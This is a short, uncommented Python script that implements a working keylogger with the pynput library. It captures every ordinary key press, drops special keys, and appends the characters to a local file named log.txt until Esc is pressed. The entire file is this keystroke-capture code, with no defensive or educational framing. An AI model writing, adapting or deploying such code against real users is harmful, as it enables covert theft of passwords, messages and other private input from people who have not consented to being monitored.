import pynput

from pynput.keyboard import Key, Listener

count = 0

def on_press(key):
    write_file(key)


def write_file(keys):
    keys = str(keys)
    keys = (keys).replace("'","")
    findOthers = keys.find("Key")
    if findOthers == -1:
        with open("log.txt","a") as file:
            file.write(keys)
    

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()